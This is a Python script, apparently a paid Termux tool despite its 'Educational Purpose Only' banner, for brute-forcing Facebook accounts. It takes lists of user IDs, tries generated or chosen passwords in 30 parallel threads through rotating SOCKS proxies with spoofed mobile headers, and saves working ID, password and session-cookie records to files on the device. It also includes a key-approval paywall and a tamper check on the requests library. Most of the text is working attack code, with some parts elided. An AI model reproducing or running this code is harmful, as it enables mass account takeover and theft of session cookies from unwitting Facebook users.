...
if not 'print' in open(first + '/sessions.py', 'r').read():
    ...
    exit('Sala Land Le Uthale Mera Method Lene Aaya Hai Madarchod Nikal BSDK')
first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
...
---------------------------------------------- 
 ...
 Versions  : 1.0
----------------------------------------------
 Note: This Tool is Educational Purpose Only-Use Your Own Risk
\033[1;37m----------------------------------------------''')
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://learningserver22.blogspot.com/2024/02/learning-server.html').text
    if id in httpCaht:
      print('\33[1;32mYour Key Register is Learning Approved')
      msg = str(os.geteuid())
      time.sleep(0.5)
      clear()
      pass
      ...
      print('Your Key : '+id)
      print('\33[1;37m----------------------------------------------')
      print (' \33[37;41m\t WELCOME TO Learning Paid TOOL \33[0;m')
      ...
      print('\33[1;37m----------------------------------------------')
      print (' \33[37;41m\t Weekly 700Rs NPR\33[0;m')
      print('\33[1;37m----------------------------------------------')
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+9779768481940?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()       
...
def login():
        ...
        try:
                data = requests.get('https://business.facebook.com/business_locations', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]','referer': 'https://m.facebook.com/','Learning': 'business.facebook.com','origin': 'https://business.facebook.com','upgrade-insecure-requests' : '1','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8','content-type':'text/html; charset=utf-8'}, cookies = {'cookie':cookies})
                ...
                linex()
                print(' Cookies login has been Learningl...')
                time.sleep(1)
                menu()
        except KeyError:
...
def sids():
    ...
    print('\n\033[1;33m Example: /sdcard/Learning.txt\033[0;97m')
                ...
                if x == ('sex'):
                        ...
                        if xd in ['1','01']:
                              ...
                              if x in ['1','01']:
                                ...
                                linex()
                                print(' [1] Method 1 (Try Yourself ) \n [2] Method 2 (Try 1) \n ' )
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print(' Select Password Crack menu');linex();print(' [1] Crack with auto password(Nepal&India) \n [2] Crack with choice password');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        for user in fo:
                                                ...
                                                if mthd in ['1','01']:
                                                        ...
                                                        crack_submit.submit(api9,ids,names,passlist)              
                                                else:
                                                        crack_submit.submit(api15,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api4(ids,names,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [Learning- M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            ses = requests.Session()
            proxs = {'http': 'socks4://'+random.choice(prox)}
            ua=random.choice(uggen)
            p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=114593902037957&kid_directed_site=0&app_id=114593902037957&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D114593902037957%26cbt%3D1701088365087%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_aiter%252F%253Fversion%253D46%2523cb%253Df3cab5fd61e0304%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%26client_id%3D114593902037957%26display%3Dtouch%26domain%3Dpixabay.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpixabay.com%252Fphotos%252F%26locale%3Den_US%26logger_id%3Df2534d0c16a119%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_aiter%252F%253Fversion%253D46%2523cb%253Df284c1bec159d1%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%2526frame%253Df3ef3d0493a9da%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_aiter%2F%3Fversion%3D46%23cb%3Df284c1bec159d1%26domain%3Dpixabay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpixabay.com%252Ff35533a5a42b844%26relation%3Dopener%26frame%3Df3ef3d0493a9da%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
            dataa ={
			...
			'is_smart_lock': False,
			'bi_xrwh': 0,
			"encpass": f"#PWD_BROWSER:0:{str(timer()).split('.')[0]}:{pas}"}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'authority': 'm.facebook.com','user-agent': ua, 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Connection': 'keep-alive', 'authority': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'en_US,en;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1','sec-fetch-dest': 'document', 'cache-control': 'max-age=0', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=114593902037957&kid_directed_site=0&app_id=114593902037957&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D114593902037957%26cbt%3D1701088365087%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_aiter%252F%253Fversion%253D46%2523cb%253Df3cab5fd61e0304%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%26client_id%3D114593902037957%26display%3Dtouch%26domain%3Dpixabay.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpixabay.com%252Fphotos%252F%26locale%3Den_US%26logger_id%3Df2534d0c16a119%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_aiter%252F%253Fversion%253D46%2523cb%253Df284c1bec159d1%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%2526frame%253Df3ef3d0493a9da%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_aiter%2F%3Fversion%3D46%23cb%3Df284c1bec159d1%26domain%3Dpixabay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpixabay.com%252Ff35533a5a42b844%26relation%3Dopener%26frame%3Df3ef3d0493a9da%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr', 'Cookie': koki}
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=114593902037957&auth_token=66fef3ff03074280b4cc1b7d3a29e6e3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1688888608254%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_aiter%252F%253Fversion%253D46%2523cb%253Dffc584e9ccd4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ffce7c979123e58%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Dhi_IN%26logger_id%3Df39524177648458%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_aiter%252F%253Fversion%253D46%2523cb%253Dfdb93871e0c28%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ffce7c979123e58%2526relation%253Dopener%2526frame%253Dfefb00c477671%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=114593902037957&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_aiter%2F%3Fversion%3D46%23cb%3Dfdb93871e0c28%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ffce7c979123e58%26relation%3Dopener%26frame%3Dfefb00c477671%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,proxies=proxs,allow_redirects=False)
            cookie = '; '.join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])
            if "c_user" in cookie:
                ids = re.search("c_user=(.*?);",str(cookie)).group(1)
                print('\r\r\033[1;32m [Learning-OK] '+ids+' | '+pas+'\033[1;97m')
                #print("\r\r\033[1;37m Cookie: "+cookie)
                open('/sdcard/Learning-Cookies.txt','a').write(str(ids)+'|'+pas+ '|' +cookie+'\n')
                open('/sdcard/Learning-OK.txt','a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif "checkpoint" in cookie:
                try:
                    uid=re.search("1000(.*?)%",str(cookie)).group(1)
                    ids = "1000"+uid
                except:
                    pass
                #print('\033[1;33m\r\r [Checkpoint] '+ids+' | '+pas)
                open('/sdcard/Learning-Checkpoint.txt','a').write(ids+'|'+pas+'\n')
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
...
def api3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Learning- M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                    'User-Agent': "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +"[FBAN/FB4A;FBAV/266.0.0.38.124;FBBV/208588814;FBDM/{density=2.25,width=720,height=1473};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '/',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'b-graph.facebook.com',
    'X-FB-Net-HNI': str(random.randint(22000,44000)),
    'X-FB-SIM-HNI': str(random.randint(22000,44000)),
    'X-FB-Connection-Type': 'MOBILE.LTE',
    'X-Tigon-Is-Retry': 'False',
    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
    'x-fb-device-group': '5151',
    ...
    'Content-Length': '512'
                                ...
                                po = requests.post(url,data=data,headers=head,proxies=proxy,allow_redirects=False).text
                                ...
                                if 'session_key' in q:
                                       ...
                                       # print('\r\r\033[1;37m Cookie: '+cookie)
                                        open('/sdcard/Learning-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/Learning-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Learning-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break        
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [Learning-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Learning-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/Learning-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api5(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Learning- M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-FB-Net-HNI': str(random.randint(28000,59000)),
    'X-FB-SIM-HNI': str(random.randint(28000,59000)),
    'X-FB-Connection-Type': 'MOBILE.LTE',
    'X-Tigon-Is-Retry': 'False',
